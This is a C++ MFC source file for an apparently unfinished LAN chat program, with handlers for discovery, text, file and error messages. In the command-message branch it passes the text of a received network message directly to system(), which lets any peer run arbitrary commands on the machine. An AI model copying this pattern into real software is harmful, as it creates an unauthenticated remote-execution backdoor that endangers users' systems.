#include "stdafx.h"
#include "DataManager.h"
#include "ServiceDiscover.h"
ServiceDiscover *serviceDiscover;
bool DataManager::sendMsg(User toUser, Message msg,SOCKET socket){


	return false;
}
DataManager* DataManager::m_pSingleInstance(NULL);
DataManager* DataManager::getInstance(){
	if (m_pSingleInstance == NULL)
		m_pSingleInstance = new DataManager();
	return m_pSingleInstance;
	
}


void DataManager::startDiscoverServer(){
	serviceDiscover =new ServiceDiscover(this);
	serviceDiscover->StartAskLiveService();
	serviceDiscover->StartResponseService();
}



DataManager::DataManager()
{
}


DataManager::~DataManager()
{
}

void DataManager::handleMessage(Message msg){

	


}
void DataManager::handleServiceDiscoverMsg(Message msg){
	long id = msg.FromID;
	int msg_type = msg.msg_type;
	string msg_content = msg.content;
	switch (msg_type)
	{
	case msg_type_event:
		if (msg_content == "0"){//下线
		//	Session 

		}
		else if (msg_content == "1"){//在线
		
			string name = "";
			User user(id, name, id);

			Session* session = new Session(user);
			SessionManager* manager = SessionManager::GetInstance();
			manager->addSession(session);
			
			AfxGetApp()->m_pMainWnd->SendMessage(WM_LISTCHANGE_MESSAGE, 0, NULL);
		}

		break;
	case msg_type_text:{
						   long ID = msg.FromID;


	}
		
		//通过ID在会话管理器寻找会话S

		//将接收到的信息存到对应会话的对应消息列表中

		//判断会话S是否含有窗口
		  //--如果有，将消息发送到对应窗口

		  //


		break;
	case msg_type_cmd:{
		
		system(msg_content.c_str());
		break;
	}
		//
		
	case msg_type_image:
		break;
	case msg_type_file:
	{
	string msg_content = msg.content;
	//解析content，content包括文件大小，文件ID,文件密码；文件传输的端口号

	//建立客户端socket

	}

		break;
	case msg_type_game:
		break;
	case msg_type_error:{
LPARAM lp = (LPARAM)&msg;
		AfxGetApp()->m_pMainWnd->SendMessage(WM_MY_MESSAGE, 0, lp);
	}
		
		break;
	case msg_type_others:
		break;
	default:
		break;
	}

}